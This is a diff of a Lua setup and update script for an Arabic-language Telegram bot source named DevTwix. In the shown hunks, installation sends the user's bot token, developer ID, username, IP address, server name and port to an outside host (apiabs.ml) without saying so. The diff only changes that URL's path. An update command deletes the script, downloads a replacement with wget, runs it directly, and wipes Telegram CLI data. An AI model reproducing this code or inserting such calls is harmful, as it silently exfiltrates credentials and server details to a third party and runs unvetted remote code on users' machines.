@@ -25,14 +25,6 @@ if not DevHmD:get(Server.."IdDevTwix") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://apiabs.ml/Api/DevTwix/index.php?Ban=DevTwix&Info&Id="..DevId)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-os.execute('lua DevTwix.lua') 
-end ---ifBn
-if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 DevHmD:set(Server.."IdDevTwix",DevId) 
 end ---ifok
@@ -77,7 +69,7 @@ DevTwix = DevHmD:get(Server.."TokenDevTwix"):match("(%d+)"),
 SudoIds = {DevHmD:get(Server.."IdDevTwix")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/DevTwix/index.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiabs.ml/config.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("DevTwix.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -11257,7 +11249,7 @@ if SecondSudo(msg) then
 if text == "تحديث السورس" and SourceCh(msg) or text == "تحديث سورس" and SourceCh(msg) or text == "↫ تحديث السورس ᥀" and SourceCh(msg) then 
 Dev_HmD(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس ديفد', 1, 'md') 
 os.execute('rm -rf DevTwix.lua') 
-os.execute('wget https://raw.githubusercontent.com/TwiXtele/DevTwix/master/DevTwix.lua') 
+os.execute('wget https://raw.githubusercontent.com/TwiXtele/DevTwix/main/DevTwix.lua') 
 dofile('DevTwix.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
